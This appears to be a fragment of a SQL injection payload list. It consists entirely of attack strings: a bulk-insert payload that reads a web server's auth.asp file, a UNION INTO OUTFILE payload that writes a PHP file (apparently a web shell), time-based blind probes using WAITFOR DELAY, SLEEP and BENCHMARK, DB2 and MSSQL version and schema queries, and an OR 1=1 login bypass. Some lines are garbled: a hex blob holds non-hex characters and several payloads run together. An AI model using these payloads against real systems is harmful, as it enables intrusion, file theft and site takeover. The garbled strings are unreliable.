...
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.aspa'" select * from myfile"--
...
' UNION SELECT 0x14CmsVwmDJfsa7wFVp24rwqH7z4MMjZVYN545b227272225d293b3f3e,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE 'afile.php'
...
")))))) waitfor delay '0:0:20' /* 
")))))) waitfor delay '0:0:20' --
")))) and 0=benchmark(3000000,MD5(1))%20%23select versionnumber, version_timestamp from sysibm.sysversions;
SELECT schemaname FROM syscat.schemata;select @@version
create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp�'" select * from myfile"--<username>' OR 1=1--
' AND SLEEP(5)--
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
